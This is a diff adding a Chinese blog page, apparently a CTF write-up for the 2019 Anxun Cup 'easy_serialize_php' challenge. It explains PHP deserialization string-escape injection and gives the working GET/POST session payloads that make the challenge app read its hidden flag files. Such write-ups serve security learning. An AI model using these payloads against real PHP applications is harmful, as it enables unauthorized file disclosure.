@@ -1,0 +1,274 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>安洵杯 2019easy_serialize_php | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="开头即可拿到源码然后提示phpinfo  phpinfo  将其base64代码最后一行有一个file_get_contents是能够读取文件的函数，他这里读取的是base64解密的’img’,往前找这个’img’一个函数serialize上，这里有一个很明显的漏洞点，数据经过序列化了之后又经过了一层过滤函数，就是数组里提到的’php’,’flag’,’php5’,’php4’,’fl1g’都会被">
+<meta property="og:type" content="article">
+<meta property="og:title" content="安洵杯 2019easy_serialize_php">
+<meta property="og:url" content="http://example.com/2021/07/13/page-73/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="开头即可拿到源码然后提示phpinfo  phpinfo  将其base64代码最后一行有一个file_get_contents是能够读取文件的函数，他这里读取的是base64解密的’img’,往前找这个’img’一个函数serialize上，这里有一个很明显的漏洞点，数据经过序列化了之后又经过了一层过滤函数，就是数组里提到的’php’,’flag’,’php5’,’php4’,’fl1g’都会被">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/11.PNG?raw=true">
+<meta property="article:published_time" content="2021-07-13T09:17:01.000Z">
+<meta property="article:modified_time" content="2021-07-14T02:52:20.308Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/11.PNG?raw=true">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-page-73" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/07/13/page-73/" class="article-date">
+  <time class="dt-published" datetime="2021-07-13T09:17:01.000Z" itemprop="datePublished">2021-07-13</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      安洵杯 2019easy_serialize_php
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p><strong>开头即可拿到源码</strong><br><strong>然后提示phpinfo  phpinfo</strong></p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/11.PNG?raw=true" alt="11.PNG"></p>
+<p>将其base64<br>代码<strong>最后一行有一个file_get_contents是能够读取文件的函数</strong>，他这里读取的是base64解密的’img’,往前找这个’img’<br>一个函数serialize上，这里有一个很明显的漏洞点，数据经过序列化了之后又经过了一层过滤函数，就是数组里提到的’php’,’flag’,’php5’,’php4’,’fl1g’都会被空格替代，而这层过滤函数会干扰序列化后的数据。</p>
+<p>在php中，反序列化的过程中必须严格按照序列化规则才能成功实现反序列化，<br><strong>特点一</strong><br>例如：</p>
+<?php
+$str='a:2:{i:0;s:6:"aaaaaa";i:1;s:3:"aaa";}';
+var_dump(unserialize($str));
+输出结果：array(2) { [0]=> string(6) "aaaaaa" [1]=> string(3) "aaa" }
+序列化如果增加或删除str的任何一个字符会导致序列化失败，但是如果在str末尾大括号外加上东西就还是可以序列出来
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span>=<span class="string">&#x27;a:2:&#123;i:0;s:6:&quot;aaaaaa&quot;;i:1;s:3:&quot;aaa&quot;;&#125;aaa&#x27;</span>;</span><br><span class="line">var_dump(unserialize(<span class="variable">$str</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span>=<span class="string">&#x27;a:2:&#123;i:0;s:6:&quot;aaaaaa&quot;;i:1;s:3:&quot;aaa&quot;;&#125;&#x27;</span>;</span><br><span class="line">var_dump(unserialize(<span class="variable">$str</span>)); </span><br></pre></td></tr></table></figure>
+
+反序列化识别有一定范围，范围外都会忽略但是不影响反序列化结果
+
+**特点二：**
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>]=<span class="string">&#x27;flagflagflagflag&#x27;</span>；</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;function&quot;</span>]=<span class="string">&#x27;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;aa&quot;;s:1:&quot;s&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;img&quot;</span>]=<span class="string">&#x27;asdasdasd&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$_SESSION</span>);</span><br></pre></td></tr></table></figure>
+
+输出：
+a:3:{s:4:"user";s:16:"flagflagflagflag";s:8:"function";s:59:"a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:2:"aa";s:1:"s";}";s:3:"img";s:9:"asdasdasd";}
+**这题存在过滤机制将flag过滤成空格**
+a:3:{s:4:"user";s:16:"";s:8:"function";s:59:"a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:2:"aa";s:1:"s";}";s:3:"img";s:9:"asdasdasd";}
+替换为空之后会向后再读取16个将其当作s:16:" " 的内容;s:8:"function";  但是这样无法读取到img的内容 
+这边这个十六就得改成24 ;s:8:"function";s:59:"a" 恰好到分号的位置 
+序列改成：a:3{s:4:"user";s:24:"flagflagflagflagflagflag";s:8:"function";s:59:"a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:2:"aa";s:1:"s";}";s:3:"img";s:9:"asdasdasd";}
+而后第三个s向后读取img的20个字符，第四个、第五个s向后读取均满足规则，所以序列化结果为：
+
+$_SESSION["user"]='";s:8:"function";s:59:"a";
+$_SESSION["img"]="ZDBnM19mMWFnLnBocA=="
+$_SESSION["aa"]="s"
+这样seeeion数组的键值img对应的值发生改变
+那么可以控制原来的session数组的function的值但无法控制，但这个方法就可以旁敲侧击的控制img的值，用ZDBnM19mMWFnLnBocA==代替了真正的base64编码，读取了d0g3_f1ag.php的内容。而识别完成后最后面的";s:3:"img";s:20:"L2QwZzNfZmxsbGxsbGFn";}被忽略掉了，不影响正常的反序列化过程。
+
+get：f=show_image
+post: _SESSION[flagflag]=";s:3:"aaa";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}
+然后大概就知道flag在哪了_
+
+base64一下 然后替换掉ZD
+
+![10.PNG](https://github.com/ajin-max/ajin-max.github.io/blob/master/img/10.PNG?raw=true)
+POST：_SESSION[flagflag]=";s:3:"aaa";s:3:"img";s:20:"L2QwZzNfZmxsbGxsbGFn";}
+
+![12.PNG](https://github.com/ajin-max/ajin-max.github.io/blob/master/img/12.PNG?raw=true)
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/07/13/page-73/" data-id="ckroqtfm6001gyww7ehdtf9ve" data-title="安洵杯 2019easy_serialize_php" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2021/07/14/page-74/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          强网杯2021 threebody
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2021/07/13/page-72/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">CISCN 2019 初赛Love Math</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">June 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">May 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">April 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">March 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2021/07/21/page-79/">MRCTF2020Ezpop</a>
+          </li>
+        
+          <li>
+            <a href="/2021/07/21/page-78/">NPUCTF2020ReadlezPHP</a>
+          </li>
+        
+          <li>
+            <a href="/2021/07/21/page-77/">网鼎杯 2020 朱雀组Nmap</a>
+          </li>
+        
+          <li>
+            <a href="/2021/07/16/page-76/">羊城杯 2020image_rar</a>
+          </li>
+        
+          <li>
+            <a href="/2021/07/14/page-74/">强网杯2021 threebody</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2021 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
